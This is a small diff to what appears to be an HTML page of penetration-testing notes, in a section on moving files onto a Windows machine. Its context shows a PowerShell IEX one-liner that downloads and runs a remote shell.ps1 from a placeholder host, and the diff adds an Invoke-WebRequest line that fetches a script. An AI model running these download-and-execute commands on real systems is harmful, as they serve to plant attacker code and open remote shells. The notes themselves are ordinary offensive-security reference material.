@@ -701,6 +701,7 @@ net localgroup administrators </code></pre><p id="b8ce0b91-149d-45bd-bc5f-2fd9e7
 
 wget &quot;http://www.contoso.com&quot; -outfile &quot;file&quot;
 
-powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://&lt;ip&gt;:&lt;port&gt;/shell.ps1&#x27;)&quot;</code></pre><p id="fa0e3e79-2fbe-4f03-890e-120b31514e18" class="">
+powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://&lt;ip&gt;:&lt;port&gt;/shell.ps1&#x27;)&quot;
+iwr -Uri 0.0.0.0/file -OutFile file.ps1</code></pre><p id="fa0e3e79-2fbe-4f03-890e-120b31514e18" class="">
 </p><p id="07dd7db7-8a66-40c8-880d-8401382c38cd" class="">Web browser available? → Navigate to the file and download.</p><p id="4f97e29a-63cf-4f6c-8dfb-f0549f23bf65" class="">
 </p></div></article></body></html>
